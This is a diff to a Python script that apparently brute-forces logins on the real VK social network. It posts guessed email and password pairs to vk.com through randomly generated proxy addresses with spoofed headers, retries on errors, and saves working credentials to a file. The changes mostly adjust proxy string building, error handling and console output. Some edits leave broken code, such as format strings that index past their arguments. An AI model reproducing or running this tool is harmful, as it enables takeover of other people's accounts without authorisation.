@@ -289,15 +289,15 @@ def proxy_generator():
 			char = str(random.randint(1, 100))
 			logging.debug('char = {}'.format(char))
 		stringproxy.append(char)
-		stringproxy.append('.')
+		# stringproxy.append('.')
 		logging.debug('stringproxy = {}'.format(stringproxy))
 	# char = str(random.randint(1, 10000))
 	# logging.debug('char = {}'.format(char))
 	# del stringproxy[-1]
 	# stringproxy.append(':')
 	# stringproxy.append(char)
-	# stringproxy = ''.join(stringproxy)
-	# logging.debug('stringproxy = {}'.format(stringproxy))
+	stringproxy = '.'.join(stringproxy)
+	logging.debug('stringproxy = {}'.format(stringproxy))
 	proxies['http'] = stringproxy
 	logging.debug('proxies["http"] = {}'.format(proxies['http']))
 
@@ -312,17 +312,17 @@ def proxy_generator():
 			char = str(random.randint(1, 100))
 			logging.debug('char = {}'.format(char))
 		stringproxy.append(char)
-		stringproxy.append('.')
+		# stringproxy.append('.')
 		logging.debug('stringproxy = {}'.format(stringproxy))
 	# char = str(random.randint(1, 10000))
 	# logging.debug('char = {}'.format(char))
 	# del stringproxy[-1]
 	# stringproxy.append(':')
 	# stringproxy.append(char)
-	# stringproxy = ''.join(stringproxy)
+	stringproxy = '.'.join(stringproxy)
 	# logging.debug('stringproxy = {}'.format(stringproxy))
-	# proxies['https'] = stringproxy
-	# logging.debug('proxies["https"] = {}'.format(proxies['https']))
+	proxies['https'] = stringproxy
+	logging.debug('proxies["https"] = {}'.format(proxies['https']))
 
 	head = possible_head[random.randint(0, len(possible_head))]
 	logging.debug('head = {}'.format(head))
@@ -331,7 +331,7 @@ def proxy_generator():
 	return proxies, head
 
 
-''' Запросы на сервер '''
+''' Queries on server '''
 
 def custom_server(login, password):
 	logging.debug('def "custom_server"')
@@ -342,11 +342,12 @@ def custom_server(login, password):
 	logging.debug('status = {}'.format(status))
 	logging.info('Requests')
 	while True:
-		# noinspection PyBroadException
 		payload = {'email': login, 'pass': password}
 		logging.debug('payload = {}'.format(payload))
+		# noinspection PyBroadException
 		try:
 			logging.debug('trying request')
+			print('\rLogin: {0} Password: {1} - '.format(login, password), end = '')
 			response = requests.post('https://vk.com/', data = payload, headers = headers, proxies = proxy)
 			logging.warning('Not errors')
 			status_code = str(response.status_code)
@@ -375,6 +376,7 @@ def custom_server(login, password):
 				logging.warning('Client error')
 				logging.debug('status = {}'.format(status))
 				time.sleep(10)
+				continue
 			else:
 				status = False
 				logging.debug('status = {}'.format(status))
@@ -384,20 +386,22 @@ def custom_server(login, password):
 			status = False
 			logging.debug('status = {}'.format(status))
 			time.sleep(2)
+			continue
 		except TimeoutError:
 			logging.warning('Time Out Error')
 			status = False
 			logging.debug('status = {}'.format(status))
 			time.sleep(60)
-		# посмотреть, как правильно называется ошибка
-		# finally:
-		# 	break
+			continue
+		except:
+			logging.warning('Error')
+			continue
 
 	logging.debug('return "status" = {}'.format(status))
 	return status
 
 
-''' Объединение '''
+''' Splitting '''
 
 class Variables:
 	logging.debug('New class "Variables"')
@@ -482,7 +486,7 @@ class Variables:
 					status = custom_server(login, password)
 					logging.debug('status = {}'.format(status))
 					if status:
-						print('\nSUCCESS! LOGIN:', login, 'PASSWORD:', password, '\n')
+						print('\tSUCCESS!\n')
 						with open('logins_passwords.txt', 'a') as f:
 							string = ("Логин: {0}\nPassword: {1}".format(login, password))
 							logging.info('login = {} and password = {} was wrote'.format(login, password))
@@ -502,7 +506,7 @@ class Variables:
 						break
 					else:
 						l += 1
-						string = '\rLogin: {0} Password: {1}\t{2} of {3} - FAIL'.format(login, password, l)
+						string = '\t{1} of {2} - FAIL'.format(l, number)
 						print(string, end='')
 						logging.info('Wrong password')
 						logging.debug('{}'.format(string))
@@ -511,13 +515,13 @@ class Variables:
 						k += 1
 						logging.debug('k = {}'.format(k))
 						if k == base:
-								logging.debug('"k" = "base"')
-								k = 0
-								logging.debug('k = {}'.format(k))
-								with open('wrongpasswords.txt', 'a') as f:
-									for i in wrongpasswords:
-										f.write(i + '\n')
-									logging.debug('"wrongpasswords" wrote in file "wrongpasswords.txt"')
+							logging.debug('"k" = "base"')
+							k = 0
+							logging.debug('k = {}'.format(k))
+							with open('wrongpasswords.txt', 'a') as f:
+								for i in wrongpasswords:
+									f.write(i + '\n')
+								logging.debug('"wrongpasswords" wrote in file "wrongpasswords.txt"')
 						break
 
 	# 1 2
@@ -577,7 +581,7 @@ class Variables:
 					status = custom_server(login, password)
 					logging.debug('status = {}'.format(status))
 					if status:
-						print('\nSUCCESS! LOGIN:', login, 'PASSWORD:', password, '\n')
+						print('\tSUCCESS!\n')
 						with open('logins_passwords.txt', 'a') as f:
 							string = ("Логин: {0}\nPassword: {1}".format(login, password))
 							logging.info('login = {} and password = {} was wrote'.format(login, password))
@@ -597,7 +601,7 @@ class Variables:
 						break
 					else:
 						l += 1
-						string = '\rLogin: {0} Password: {1}\t{2} of {3} - FAIL'.format(login, password, l)
+						string = '\t{1} of {2} - FAIL'.format(l, number)
 						print(string, end='')
 						logging.info('Wrong password')
 						logging.debug('{}'.format(string))
@@ -606,13 +610,13 @@ class Variables:
 						k += 1
 						logging.debug('k = {}'.format(k))
 						if k == base:
-								logging.debug('"k" = "base"')
-								k = 0
-								logging.debug('k = {}'.format(k))
-								with open('wrongpasswords.txt', 'a') as f:
-									for i in wrongpasswords:
-										f.write(i + '\n')
-									logging.debug('"wrongpasswords" wrote in file "wrongpasswords.txt"')
+							logging.debug('"k" = "base"')
+							k = 0
+							logging.debug('k = {}'.format(k))
+							with open('wrongpasswords.txt', 'a') as f:
+								for i in wrongpasswords:
+									f.write(i + '\n')
+								logging.debug('"wrongpasswords" wrote in file "wrongpasswords.txt"')
 						break
 
 	# 1 3
@@ -676,7 +680,7 @@ class Variables:
 					status = custom_server(login, password)
 					logging.debug('status = {}'.format(status))
 					if status:
-						print('\nSUCCESS! LOGIN:', login, 'PASSWORD:', password, '\n')
+						print('\tSUCCESS!\n')
 						with open('logins_passwords.txt', 'a') as f:
 							string = ("Логин: {0}\nPassword: {1}".format(login, password))
 							logging.info('login = {} and password = {} was wrote'.format(login, password))
@@ -696,7 +700,7 @@ class Variables:
 						break
 					else:
 						l += 1
-						string = '\rLogin: {0} Password: {1}\t{2} of {3} - FAIL'.format(login, password, l, number)
+						string = '\t{1} of {2} - FAIL'.format(l, number)
 						print(string, end='')
 						logging.info('Wrong password')
 						logging.debug('{}'.format(string))
@@ -713,8 +717,6 @@ class Variables:
 									f.write(i + '\n')
 								logging.debug('"wrongpasswords" wrote in file "wrongpasswords.txt"')
 						break
-			else:
-				pass
 
 	# 2 1
 	# noinspection PyPep8Naming,PyShadowingNames
@@ -763,7 +765,7 @@ class Variables:
 						status = custom_server(login, password)
 						logging.debug('status = {}'.format(status))
 						if status:
-							print('\nSUCCESS! LOGIN:', login, 'PASSWORD:', password, '\n')
+							print('\tSUCCESS!\n')
 							with open('logins_passwords.txt', 'a') as f:
 								string = ("Логин: {0}\nPassword: {1}".format(login, password))
 								logging.info('login = {} and password = {} was wrote'.format(login, password))
@@ -783,7 +785,7 @@ class Variables:
 							break
 						else:
 							l += 1
-							string = '\rLogin: {0} Password: {1}\t{2} of {3} - FAIL'.format(login, password, l)
+							string = '\t{1} of {2} - FAIL'.format(l, number)
 							print(string, end='')
 							logging.info('Wrong password')
 							logging.debug('{}'.format(string))
@@ -837,7 +839,7 @@ class Variables:
 						status = custom_server(login, password)
 						logging.debug('status = {}'.format(status))
 						if status:
-							print('\nSUCCESS! LOGIN:', login, 'PASSWORD:', password, '\n')
+							print('\tSUCCESS!\n')
 							with open('logins_passwords.txt', 'a') as f:
 								string = ("Логин: {0}\nPassword: {1}".format(login, password))
 								logging.info('login = {} and password = {} was wrote'.format(login, password))
@@ -857,7 +859,7 @@ class Variables:
 							break
 						else:
 							l += 1
-							string = '\rLogin: {0} Password: {1}\t{2} of {3} - FAIL'.format(login, password, l)
+							string = '\t{1} of {2} - FAIL'.format(l, number)
 							print(string, end='')
 							logging.info('Wrong password')
 							logging.debug('{}'.format(string))
@@ -927,7 +929,7 @@ class Variables:
 						status = custom_server(login, password)
 						logging.debug('status = {}'.format(status))
 						if status:
-							print('\nSUCCESS! LOGIN:', login, 'PASSWORD:', password, '\n')
+							print('\tSUCCESS!\n')
 							with open('logins_passwords.txt', 'a') as f:
 								string = ("Логин: {0}\nPassword: {1}".format(login, password))
 								logging.info('login = {} and password = {} was wrote'.format(login, password))
@@ -947,7 +949,7 @@ class Variables:
 							break
 						else:
 							l += 1
-							string = '\rLogin: {0} Password: {1}\t{2} of {3} - FAIL'.format(login, password, l)
+							string = '\t{1} of {2} - FAIL'.format(l, number)
 							print(string, end='')
 							logging.info('Wrong password')
 							logging.debug('{}'.format(string))
@@ -963,8 +965,6 @@ class Variables:
 									for i in wrongpasswords:
 										f.write(i + '\n')
 									logging.debug('"wrongpasswords" wrote in file "wrongpasswords.txt"')
-							else:
-								pass
 							break
 
 
